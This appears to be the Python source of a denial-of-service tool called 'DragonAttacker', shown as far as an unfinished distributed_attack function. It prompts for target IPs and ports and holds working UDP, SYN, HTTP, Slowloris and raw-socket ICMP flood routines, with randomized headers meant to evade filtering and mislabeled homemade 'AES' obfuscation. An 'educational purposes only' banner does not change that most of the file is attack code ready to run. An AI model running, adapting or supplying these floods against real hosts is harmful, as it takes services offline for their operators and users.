import json
import random
import multiprocessing
import time
import socket
import psutil
import logging
import struct
import os
import unittest
from unittest.mock import patch
import asyncio
import hashlib
import hmac as hmac_lib
from threading import Thread
import uuid
import ipaddress
import sys
import platform
import traceback
from multiprocessing import Manager
import ssl

if platform.system() != "Windows":
    import resource

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BLACK = '\033[98m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

class ColoredLogger:
    def __init__(self, name):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        ch = logging.StreamHandler()
        ch.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

    def info(self, msg):
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} {msg}")
        self.logger.info(msg)

    def warning(self, msg):
        print(f"{Colors.YELLOW}[WARNING]{Colors.RESET} {msg}")
        self.logger.warning(msg)

    def error(self, msg):
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {msg}")
        self.logger.error(msg)

    def critical(self, msg):
        print(f"{Colors.RED}{Colors.BOLD}[CRITICAL]{Colors.RESET} {msg}")
        self.logger.critical(msg)

    def debug(self, msg):
        print(f"{Colors.GREEN}[DEBUG]{Colors.RESET} {msg}")
        self.logger.debug(msg)

logger = ColoredLogger("DragonAttacker")

DEFAULT_CONFIG = {
    "target_ips": [],
    "target_port": 80,
    "packet_size": 1024,
    "num_processes": 10,
    "use_anonymization": False
}

def ask_for_target_info():
    config = DEFAULT_CONFIG.copy()
    print(f"\n{Colors.CYAN}{Colors.BOLD}====== TARGET CONFIGURATION ======{Colors.RESET}")
    print(f"\n{Colors.BOLD}Enter target IP addresses{Colors.RESET} (separate multiple IPs with commas):")
    target_ips_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if target_ips_input:
        target_ips = [ip.strip() for ip in target_ips_input.split(',')]
        valid_ips = []
        for ip in target_ips:
            try:
                ipaddress.ip_address(ip)
                valid_ips.append(ip)
            except ValueError:
                print(f"{Colors.RED}Invalid IP address: {ip} - skipping{Colors.RESET}")
        if valid_ips:
            config["target_ips"] = valid_ips
        else:
            print(f"{Colors.YELLOW}No valid IPs provided, using default: {config['target_ips']}{Colors.RESET}")

    print(f"\n{Colors.BOLD}Enter target port{Colors.RESET} (default: {config['target_port']}):")
    port_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if port_input:
        try:
            port = int(port_input)
            if 1 <= port <= 65535:
                config["target_port"] = port
            else:
                print(f"{Colors.YELLOW}Port must be between 1-65535, using default: {config['target_port']}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.YELLOW}Invalid port, using default: {config['target_port']}{Colors.RESET}")

    print(f"\n{Colors.BOLD}Enter packet size in bytes{Colors.RESET} (default: {config['packet_size']}):")
    size_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if size_input:
        try:
            size = int(size_input)
            if size > 0:
                config["packet_size"] = size
            else:
                print(f"{Colors.YELLOW}Packet size must be positive, using default: {config['packet_size']}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.YELLOW}Invalid packet size, using default: {config['packet_size']}{Colors.RESET}")

    print(f"\n{Colors.BOLD}Enter number of processes{Colors.RESET} (1-8, default: {config['num_processes']}):")
    processes_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
    if processes_input:
        try:
            processes = int(processes_input)
            if 1 <= processes <= 8:
                config["num_processes"] = processes
            else:
                print(f"{Colors.YELLOW}Number of processes must be between 1-8, using default: {config['num_processes']}{Colors.RESET}")
        except ValueError:
            print(f"{Colors.YELLOW}Invalid number, using default: {config['num_processes']}{Colors.RESET}")

    print(f"\n{Colors.BOLD}Enable traffic anonymization? (y/n){Colors.RESET} (default: {'yes' if config['use_anonymization'] else 'no'}):")
    anon_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
    if anon_input in ('y', 'yes', 'n', 'no'):
        config["use_anonymization"] = anon_input in ('y', 'yes')

    print(f"\n{Colors.BOLD}Save this configuration for future use? (y/n){Colors.RESET}")
    save_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
    if save_input in ('y', 'yes'):
        with open("config.json", "w") as config_file:
            json.dump(config, config_file, indent=2)
            print(f"{Colors.GREEN}Configuration saved to config.json{Colors.RESET}")

    print(f"\n{Colors.CYAN}{Colors.BOLD}====== CONFIGURATION SUMMARY ======{Colors.RESET}")
    print(f"{Colors.CYAN}Target IPs:{Colors.RESET} {', '.join(config['target_ips'])}")
    print(f"{Colors.CYAN}Target Port:{Colors.RESET} {config['target_port']}")
    print(f"{Colors.CYAN}Packet Size:{Colors.RESET} {config['packet_size']} bytes")
    print(f"{Colors.CYAN}Processes:{Colors.RESET} {config['num_processes']}")
    print(f"{Colors.CYAN}Anonymization:{Colors.RESET} {'Enabled' if config['use_anonymization'] else 'Disabled'}")
    print()
    return config

def load_or_ask_config():
    config_file_path = "config.json"
    try:
        with open(config_file_path, "r") as config_file:
            loaded_config = json.load(config_file)
            logger.info("Configuration loaded from config.json for default values")
            config = DEFAULT_CONFIG.copy()
            config.update(loaded_config)
            if not config["target_ips"]:
                config["target_ips"] = DEFAULT_CONFIG["target_ips"]
            if not (1 <= config["target_port"] <= 65535):
                logger.warning(f"Port {config['target_port']} is out of range - using default")
                config["target_port"] = DEFAULT_CONFIG["target_port"]
            if "use_anonymization" not in loaded_config:
                if "use_tor" in loaded_config or "use_socks_proxy" in loaded_config:
                    config["use_anonymization"] = loaded_config.get("use_tor", False) or loaded_config.get("use_socks_proxy", False)
                    logger.info("Migrated legacy configuration keys to use_anonymization")

            print(f"\n{Colors.CYAN}{Colors.BOLD}====== SAVED CONFIGURATION ======{Colors.RESET}")
            print(f"{Colors.CYAN}Default Target IPs:{Colors.RESET} {', '.join(config['target_ips'])}")
            print(f"{Colors.CYAN}Default Target Port:{Colors.RESET} {config['target_port']}")
            print(f"{Colors.CYAN}Default Packet Size:{Colors.RESET} {config['packet_size']} bytes")
            print(f"{Colors.CYAN}Default Processes:{Colors.RESET} {config['num_processes']}")
            print(f"{Colors.CYAN}Default Anonymization:{Colors.RESET} {'Enabled' if config['use_anonymization'] else 'Disabled'}")
            print(f"\n{Colors.BOLD}{Colors.GREEN}You must enter new target information for this session:{Colors.RESET}")
            old_target_ips = config["target_ips"]
            old_target_port = config["target_port"]

            print(f"\n{Colors.BOLD}Enter target IP addresses{Colors.RESET} (separate multiple IPs with commas):")
            print(f"{Colors.YELLOW}Previous: {', '.join(old_target_ips)}{Colors.RESET}")
            target_ips_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
            if target_ips_input:
                target_ips = [ip.strip() for ip in target_ips_input.split(',')]
                valid_ips = []
                for ip in target_ips:
                    try:
                        ipaddress.ip_address(ip)
                        valid_ips.append(ip)
                    except ValueError:
                        print(f"{Colors.RED}Invalid IP address: {ip} - skipping{Colors.RESET}")
                if valid_ips:
                    config["target_ips"] = valid_ips
                else:
                    print(f"{Colors.YELLOW}No valid IPs provided, using previous: {', '.join(old_target_ips)}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}No input provided, using previous: {', '.join(old_target_ips)}{Colors.RESET}")

            print(f"\n{Colors.BOLD}Enter target port{Colors.RESET} (default: {old_target_port}):")
            port_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
            if port_input:
                try:
                    port = int(port_input)
                    if 1 <= port <= 65535:
                        config["target_port"] = port
                    else:
                        print(f"{Colors.YELLOW}Port must be between 1-65535, using previous: {old_target_port}{Colors.RESET}")
                except ValueError:
                    print(f"{Colors.YELLOW}Invalid port, using previous: {old_target_port}{Colors.RESET}")

            print(f"\n{Colors.BOLD}Do you want to update other configuration values (packet size, processes, etc)? (y/n){Colors.RESET}")
            update_other = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
            if update_other in ('y', 'yes'):
                print(f"\n{Colors.BOLD}Enter packet size in bytes{Colors.RESET} (default: {config['packet_size']}):")
                size_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
                if size_input:
                    try:
                        size = int(size_input)
                        if size > 0:
                            config["packet_size"] = size
                        else:
                            print(f"{Colors.YELLOW}Packet size must be positive, using previous: {config['packet_size']}{Colors.RESET}")
                    except ValueError:
                        print(f"{Colors.YELLOW}Invalid packet size, using previous: {config['packet_size']}{Colors.RESET}")

                print(f"\n{Colors.BOLD}Enter number of processes{Colors.RESET} (1-8, default: {config['num_processes']}):")
                processes_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip()
                if processes_input:
                    try:
                        processes = int(processes_input)
                        if 1 <= processes <= 8:
                            config["num_processes"] = processes
                        else:
                            print(f"{Colors.YELLOW}Number of processes must be between 1-8, using previous: {config['num_processes']}{Colors.RESET}")
                    except ValueError:
                        print(f"{Colors.YELLOW}Invalid number, using previous: {config['num_processes']}{Colors.RESET}")

                print(f"\n{Colors.BOLD}Enable traffic anonymization? (y/n){Colors.RESET} (default: {'yes' if config['use_anonymization'] else 'no'}):")
                anon_input = input(f"{Colors.GREEN}> {Colors.RESET}").strip().lower()
                if anon_input in ('y', 'yes', 'n', 'no'):
                    config["use_anonymization"] = anon_input in ('y', 'yes')

    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        logger.warning(f"Config file issue: {e}. Creating a new configuration.")
        if os.path.exists(config_file_path) and not isinstance(e, FileNotFoundError):
            try:
                backup_path = f"{config_file_path}.bak"
                os.rename(config_file_path, backup_path)
                logger.info(f"Backed up corrupted config to {backup_path}")
            except Exception as backup_error:
                try:
                    os.remove(config_file_path)
                    logger.info(f"Deleted corrupted config file: {config_file_path}")
                except Exception as del_error:
                    logger.error(f"Failed to remove corrupted config: {del_error}")
        config = ask_for_target_info()

    print(f"\n{Colors.CYAN}{Colors.BOLD}====== FINAL CONFIGURATION ======{Colors.RESET}")
    print(f"{Colors.CYAN}Target IPs:{Colors.RESET} {', '.join(config['target_ips'])}")
    print(f"{Colors.CYAN}Target Port:{Colors.RESET} {config['target_port']}")
    print(f"{Colors.CYAN}Packet Size:{Colors.RESET} {config['packet_size']} bytes")
    print(f"{Colors.CYAN}Processes:{Colors.RESET} {config['num_processes']}")
    print(f"{Colors.CYAN}Anonymization:{Colors.RESET} {'Enabled' if config['use_anonymization'] else 'Disabled'}")
    print()
    return config

class CryptoManager:
    def __init__(self):
        self.aes_key = os.urandom(32)
        self.hmac_key = os.urandom(64)
        self.last_rotation = time.time()
        self.rotation_interval = 300
        self.cipher_modes = ['ctr', 'cfb', 'ofb']
        self.current_mode = 0

    def maybe_rotate_keys(self):
        if time.time() - self.last_rotation > self.rotation_interval:
            system_entropy = str(psutil.cpu_percent()) + str(psutil.virtual_memory()) + str(time.time())
            entropy_hash = hashlib.sha256(system_entropy.encode() + os.urandom(32)).digest()
            self.aes_key = bytes(a ^ b for a, b in zip(self.aes_key, entropy_hash))
            self.hmac_key = hashlib.sha512(self.hmac_key + entropy_hash).digest()
            self.current_mode = (self.current_mode + 1) % len(self.cipher_modes)
            self.last_rotation = time.time()
            logger.debug("Encryption keys and cipher mode rotated")

    def get_current_mode(self):
        return self.cipher_modes[self.current_mode]

    def encrypt(self, data):
        self.maybe_rotate_keys()
        iv = os.urandom(16)
        stage1 = bytearray(len(data))
        for i in range(len(data)):
            key_byte = self.aes_key[i % len(self.aes_key)]
            iv_byte = iv[i % len(iv)]
            position_salt = (i * 7 + 13) & 0xFF
            stage1[i] = (data[i] ^ key_byte ^ iv_byte ^ position_salt) & 0xFF

        mode = self.get_current_mode()
        if mode == 'ctr':
            counter = 0
            for i in range(0, len(stage1), 16):
                block = stage1[i:i+16]
                counter_bytes = counter.to_bytes(16, byteorder='big')
                for j in range(len(block)):
                    if i+j < len(stage1):
                        stage1[i+j] = (stage1[i+j] + counter_bytes[j % 16]) & 0xFF
                counter += 1
        elif mode == 'cfb':
            prev_block = iv
            for i in range(0, len(stage1), 16):
                block = stage1[i:i+16]
                for j in range(len(block)):
                    if i+j < len(stage1):
                        stage1[i+j] = (stage1[i+j] ^ prev_block[j % 16]) & 0xFF
                prev_block = bytes(stage1[i:i+16])
        elif mode == 'ofb':
            feedback = iv
            for i in range(0, len(stage1), 16):
                keystream = bytes(x ^ y for x, y in zip(feedback, self.aes_key[:16]))
                for j in range(len(keystream)):
                    if i+j < len(stage1):
                        stage1[i+j] = stage1[i+j] ^ keystream[j]
                feedback = keystream
        mode_byte = self.cipher_modes.index(mode).to_bytes(1, byteorder='big')
        return iv + mode_byte + bytes(stage1)

    def sign(self, data):
        self.maybe_rotate_keys()
        h = hmac_lib.new(self.hmac_key, data, hashlib.sha512)
        signature = h.digest()
        timestamp = int(time.time()).to_bytes(8, byteorder='big')
        return timestamp + signature

crypto_manager = CryptoManager()

def encrypt_payload(payload):
    return crypto_manager.encrypt(payload)

def sign_payload(payload):
    return crypto_manager.sign(payload)

class LocalProxy:
    def __init__(self):
        self.enabled = False
        self.hop_count = 3
        self.proxy_thread = None

    def enable(self):
        self.enabled = True
        logger.info("Local anonymization proxy enabled with {} hops".format(self.hop_count))
        self.proxy_thread = Thread(target=self._proxy_loop, daemon=True)
        self.proxy_thread.start()

    def disable(self):
        self.enabled = False
        logger.info("Local anonymization proxy disabled")

    def _proxy_loop(self):
        while self.enabled:
            time.sleep(10)
            logger.debug(f"Proxy hop simulation active with {self.hop_count} hops")

    def rotate_identity(self):
        if self.enabled:
            logger.info("Rotating anonymization identity")
            return True
        return False

local_proxy = LocalProxy()

def setup_anonymization():
    if config["use_anonymization"]:
        try:
            local_proxy.enable()
            logger.info("Anonymization enabled.")
            return True
        except Exception as e:
            logger.error(f"Error setting up anonymization: {e}")
            return False
    return False

def rotate_identity(retries=3):
    if config["use_anonymization"]:
        for attempt in range(retries):
            try:
                if local_proxy.rotate_identity():
                    logger.info("Identity rotated successfully.")
                    return True
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error rotating identity (attempt {attempt + 1}): {e}")
                time.sleep(5)
        logger.critical("Failed to rotate identity after multiple attempts.")
        return False
    return True

def limit_system_resources():
    try:
        p = psutil.Process(os.getpid())
        if platform.system() == "Windows":
            p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        else:
            p.nice(10)
        logger.info("Process priority adjusted to limit CPU usage")

        if platform.system() != "Windows":
            if "max_memory_usage" in config:
                max_memory = int(psutil.virtual_memory().total * (config["max_memory_usage"] / 100))
                resource.setrlimit(resource.RLIMIT_AS, (max_memory, max_memory))
                logger.info(f"Memory usage limited to {config['max_memory_usage']}% via resource module")
        return True
    except Exception as e:
        logger.error(f"Error limiting system resources: {e}")
        return False

def generate_random_iv():
    return os.urandom(16)

class IPAddressGenerator:
    @staticmethod
    def get_random_ip(use_ipv6=False):
        if use_ipv6:
            parts = [f"{random.randint(0, 0xffff):x}" for _ in range(8)]
            return ":".join(parts)
        else:
            return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

class SimpleBehavioralAnalysis:
    def __init__(self, window_size=100):
        self.window_size = window_size
        self.cpu_samples = []
        self.memory_samples = []
        self.network_samples = []
        self.threshold = 2.0

    def add_sample(self):
        cpu = psutil.cpu_percent(interval=0.1)
        memory = psutil.virtual_memory().percent
        network = psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv
        self.cpu_samples.append(cpu)
        self.memory_samples.append(memory)
        self.network_samples.append(network)
        if len(self.cpu_samples) > self.window_size:
            self.cpu_samples.pop(0)
            self.memory_samples.pop(0)
            self.network_samples.pop(0)

    def check_anomalies(self):
        if len(self.cpu_samples) < 10:
            return False
        cpu_mean = sum(self.cpu_samples) / len(self.cpu_samples)
        cpu_std = (sum((x - cpu_mean) ** 2 for x in self.cpu_samples) / len(self.cpu_samples)) ** 0.5
        mem_mean = sum(self.memory_samples) / len(self.memory_samples)
        mem_std = (sum((x - mem_mean) ** 2 for x in self.memory_samples) / len(self.memory_samples)) ** 0.5
        latest_cpu = self.cpu_samples[-1]
        latest_mem = self.memory_samples[-1]
        cpu_anomaly = abs(latest_cpu - cpu_mean) > (self.threshold * cpu_std) if cpu_std > 0 else False
        mem_anomaly = abs(latest_mem - mem_mean) > (self.threshold * mem_std) if mem_std > 0 else False
        return cpu_anomaly or mem_anomaly

def print_banner():
    dragon = f"""
{Colors.RED}{Colors.BOLD}             /\\_                   _/\\
            [ {Colors.YELLOW}0{Colors.RED} ]                 [ {Colors.YELLOW}0{Colors.RED} ]
             \\./    {Colors.PURPLE} ▄▄▄▄▄▄▄▄▄▄▄▄▄ {Colors.RED}    \\./
     /\\_/\\_/\\/ {Colors.PURPLE}   █ DRAGON █{Colors.RED}    \\/\\_/\\_/\\
     \\/ \\/ \\/    {Colors.PURPLE}█ ATTACKER █{Colors.RED}    \\/ \\/ \\/
     /\\_/\\_/\\    {Colors.PURPLE}▀▀▀▀▀▀▀▀▀▀▀▀▀{Colors.RED}    /\\_/\\_/\\
     \\/ \\/ \\/                       \\/ \\/ \\/
{Colors.RESET}"""
    print(dragon)
    print(f"{Colors.YELLOW}{'='*80}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.{Colors.RESET}")
    print(f"{Colors.RED}Using this tool against systems without explicit permission is ILLEGAL.{Colors.RESET}")
    print(f"{Colors.RED}The author assumes NO LIABILITY for misuse of this software.{Colors.RESET}")
    print(f"{Colors.YELLOW}{'='*80}{Colors.RESET}")
    print()

def print_stats(cpu_usage, memory_usage, network_io):
    cpu_color = Colors.GREEN
    if cpu_usage > 70:
        cpu_color = Colors.RED
    elif cpu_usage > 40:
        cpu_color = Colors.YELLOW
    mem_color = Colors.GREEN
    if memory_usage > 70:
        mem_color = Colors.RED
    elif memory_usage > 40:
        mem_color = Colors.YELLOW
    sent_kb = network_io.bytes_sent / 1024
    recv_kb = network_io.bytes_recv / 1024
    sent_str = f"{sent_kb/1024:.2f} MB" if sent_kb > 1024 else f"{sent_kb:.2f} KB"
    recv_str = f"{recv_kb/1024:.2f} MB" if recv_kb > 1024 else f"{recv_kb:.2f} KB"
    print(f"\r{Colors.BOLD}CPU:{Colors.RESET} {cpu_color}{cpu_usage:5.1f}%{Colors.RESET} | "
          f"{Colors.BOLD}RAM:{Colors.RESET} {mem_color}{memory_usage:5.1f}%{Colors.RESET} | "
          f"{Colors.BOLD}NET:{Colors.RESET} {Colors.BLUE}↑{sent_str}{Colors.RESET} {Colors.GREEN}↓{recv_str}{Colors.RESET}", end="")

def monitor_system_resources(stop_event):
    analyzer = SimpleBehavioralAnalysis()
    logger.info("Monitoring system resources...")
    try:
        while not stop_event.is_set():
            cpu_usage = psutil.cpu_percent(interval=1)
            memory_usage = psutil.virtual_memory().percent
            network_io = psutil.net_io_counters()
            print_stats(cpu_usage, memory_usage, network_io)
            analyzer.add_sample()
            if analyzer.check_anomalies():
                print()
                logger.warning("System behavior anomaly detected!")
            time.sleep(1)
    except Exception as e:
        logger.error(f"Error monitoring system resources: {e}")
    finally:
        print()

async def udp_flood_async(target_ip, target_port, packet_size, ipv6=False):
    logger.warning(f"Starting UDP Flood attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET} with packet size {packet_size}...")
    packets_sent = 0
    bytes_sent = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET6 if ipv6 else socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            payload = os.urandom(packet_size)
            encrypted_payload = encrypt_payload(payload)
            signed_payload = sign_payload(encrypted_payload)
            sock.bind(('', random.randint(1024, 65535)))
            sock.sendto(signed_payload, (target_ip, target_port))
            sock.close()
            packets_sent += 1
            bytes_sent += len(signed_payload)
            if packets_sent % 100 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                logger.info(f"UDP Flood: {packets_sent} packets ({mb_sent:.2f} MB) sent to {target_ip}:{target_port}")
            await asyncio.sleep(random.uniform(0.001, 0.1))
        except Exception as e:
            logger.error(f"Error during UDP Flood: {e}")

def syn_flood(target_ip, target_port, ipv6=False):
    logger.warning(f"Starting SYN Flood attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET}...")
    packets_sent = 0
    while True:
        try:
            sock = socket.socket(socket.AF_INET6 if ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.bind(('', random.randint(1024, 65535)))
            sock.connect_ex((target_ip, target_port))
            sock.close()
            packets_sent += 1
            if packets_sent % 100 == 0:
                logger.info(f"SYN Flood: {packets_sent} packets sent to {target_ip}:{target_port}")
            time.sleep(random.uniform(0.001, 0.1))
        except Exception as e:
            logger.error(f"Error during SYN Flood: {e}")

async def http_flood_async(target_ip, target_port, packet_size, ipv6=False):
    logger.warning(f"Starting HTTP Flood attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET} with advanced techniques...")
    packets_sent = 0
    bytes_sent = 0
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
    ]
    http_methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
    paths = ["/", "/index.html", "/api/", "/login", "/admin", "/wp-login.php", "/register", "/upload", "/images", "/includes/config.php", "/admin/config.php", "/search", "/forum", "/includes/js/", "/checkout", "/cart", "/account", "/profile", "/settings"]
    extensions = ["php", "html", "asp", "aspx", "jsp", "json", "xml", "js", "css", "txt"]
    param_names = ["id", "user", "page", "query", "search", "token", "auth", "session", "item", "product", "category", "sort", "order", "limit", "offset", "start", "end", "filter", "format"]
    while True:
        try:
            sock = socket.socket(socket.AF_INET6 if ipv6 else socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, target_port))
            method = random.choice(http_methods)
            base_path = random.choice(paths)
            if random.random() < 0.3 and method == "GET":
                base_path += "." + random.choice(extensions)
            if method == "GET" and random.random() < 0.7:
                params = [f"{random.choice(param_names)}={hashlib.md5(os.urandom(8)).hexdigest()[:10]}" for _ in range(random.randint(1, 5))]
                path = base_path + "?" + "&".join(params)
            else:
                path = base_path
            user_agent = random.choice(user_agents)
            referers = [f"https://www.google.com/search?q={target_ip}", f"https://www.facebook.com/{target_ip}", f"https://www.bing.com/search?q={target_ip}", f"https://twitter.com/search?q={target_ip}", f"https://www.linkedin.com/search/results/all/?keywords={target_ip}", f"https://{IPAddressGenerator.get_random_ip()}/refer"]
            referer = random.choice(referers)
            accept_types = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "application/json,text/plain,*/*", "*/*"]
            accept = random.choice(accept_types)
            headers = [f"{method} {path} HTTP/1.1", f"Host: {target_ip}:{target_port}", f"User-Agent: {user_agent}", f"Accept: {accept}", f"Accept-Language: en-US,en;q=0.9,fr;q=0.8", f"Accept-Encoding: gzip, deflate", f"Referer: {referer}", f"Connection: keep-alive", f"Cache-Control: max-age={random.randint(0, 3600)}"]
            if random.random() < 0.7:
                session_id = hashlib.sha256(os.urandom(16)).hexdigest()
                user_id = random.randint(1000, 9999)
                headers.append(f"Cookie: session={session_id}; user_id={user_id}; visited=true; theme=dark")
            body = ""
            if method in ["POST", "PUT"]:
                content_types = ["application/x-www-form-urlencoded", "application/json", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW", "text/plain"]
                content_type = random.choice(content_types)
                headers.append(f"Content-Type: {content_type}")
                if content_type == "application/x-www-form-urlencoded":
                    form_data = [f"{random.choice(param_names)}={hashlib.md5(os.urandom(8)).hexdigest()}" for _ in range(random.randint(1, 10))]
                    body = "&".join(form_data)
                elif content_type == "application/json":
                    json_data = {random.choice(param_names): hashlib.md5(os.urandom(8)).hexdigest() for _ in range(random.randint(1, 10))}
                    body = json.dumps(json_data)
                elif content_type.startswith("multipart/form-data"):
                    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
                    multipart_data = []
                    for _ in range(random.randint(1, 5)):
                        key = random.choice(param_names)
                        value = hashlib.md5(os.urandom(8)).hexdigest()
                        multipart_data.extend([f"--{boundary}", f'Content-Disposition: form-data; name="{key}"', "", value])
                    multipart_data.append(f"--{boundary}--")
                    body = "\r\n".join(multipart_data)
                else:
                    body = "A" * random.randint(1, packet_size)
                headers.append(f"Content-Length: {len(body)}")
            request = "\r\n".join(headers) + "\r\n\r\n" + body
            encrypted_request = encrypt_payload(request.encode())
            sock.sendall(encrypted_request)
            packets_sent += 1
            bytes_sent += len(encrypted_request)
            if packets_sent % 50 == 0:
                mb_sent = bytes_sent / (1024 * 1024)
                logger.info(f"HTTP Flood: {packets_sent} requests ({mb_sent:.2f} MB) sent to {target_ip}:{target_port}")
            try:
                sock.settimeout(0.5)
                sock.recv(1024)
            except:
                pass
            sock.close()
            await asyncio.sleep(random.uniform(0.05, 0.2))
        except Exception as e:
            logger.error(f"Error during HTTP Flood: {e}")
            await asyncio.sleep(random.uniform(0.1, 0.5))

async def slowloris_attack(target_ip, target_port, max_connections=150):
    logger.warning(f"Starting Slowloris attack on {Colors.BOLD}{target_ip}:{target_port}{Colors.RESET} with {max_connections} connections...")
    socket_list = []
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
    ]
    try:
        logger.info(f"Establishing {max_connections} connections for Slowloris attack...")
        while True:
            while len(socket_list) < max_connections:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((target_ip, target_port))
                    user_agent = random.choice(user_agents)
                    partial_request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
                    partial_request += f"Host: {target_ip}\r\n"
                    partial_request += f"User-Agent: {user_agent}\r\n"
                    partial_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    s.send(partial_request.encode())
                    socket_list.append(s)
                    if len(socket_list) % 50 == 0:
                        logger.info(f"Slowloris: {len(socket_list)} connections established")
                except Exception:
                    pass
            logger.info(f"Maintaining {len(socket_list)} Slowloris connections...")
            for i in range(len(socket_list) - 1, -1, -1):
                try:
                    keep_alive = f"X-a: {random.randint(1, 5000)}\r\n"
                    socket_list[i].send(keep_alive.encode())
                except:
                    socket_list[i].close()
                    socket_list.pop(i)
            logger.info(f"Slowloris: Maintaining {len(socket_list)} connections - sending keep-alive")
            await asyncio.sleep(random.uniform(10, 15))
    except Exception as e:
        logger.error(f"Error in Slowloris attack: {e}")
    finally:
        for s in socket_list:
            try:
                s.close()
            except:
                pass

def icmp_flood(target_ip, counters=None):
    if not (hasattr(os, 'geteuid') and os.geteuid() == 0):
        logger.warning(f"ICMP Flood requires root privileges - skipping attack on {target_ip}")
        return
    logger.warning(f"Starting ICMP Flood attack on {Colors.BOLD}{target_ip}{Colors.RESET}...")
    packets_sent = 0
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.settimeout(1)
        while True:
            try:
                icmp_type, icmp_code, icmp_checksum = 8, 0, 0
                icmp_id = random.randint(1, 65535)
                icmp_seq = random.randint(1, 65535)
                icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                payload = os.urandom(random.randint(32, 1472))
                icmp_packet = icmp_header + payload
                icmp_checksum = 0
                for i in range(0, len(icmp_packet), 2):
                    if i + 1 < len(icmp_packet):
                        icmp_checksum += (icmp_packet[i] << 8) + icmp_packet[i + 1]
                    else:
                        icmp_checksum += icmp_packet[i] << 8
                icmp_checksum = (icmp_checksum >> 16) + (icmp_checksum & 0xFFFF)
                icmp_checksum = ~icmp_checksum & 0xFFFF
                icmp_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                sock.sendto(icmp_packet, (target_ip, 0))
                packets_sent += 1
                if packets_sent % 100 == 0:
                    logger.info(f"ICMP Flood: {packets_sent} packets sent to {target_ip}")
                time.sleep(random.uniform(0.001, 0.01))
            except Exception as e:
                logger.error(f"Error sending ICMP packet: {e}")
                time.sleep(0.1)
    except Exception as e:
        logger.error(f"Error during ICMP Flood: {e}")

def distributed_attack(stop_event):
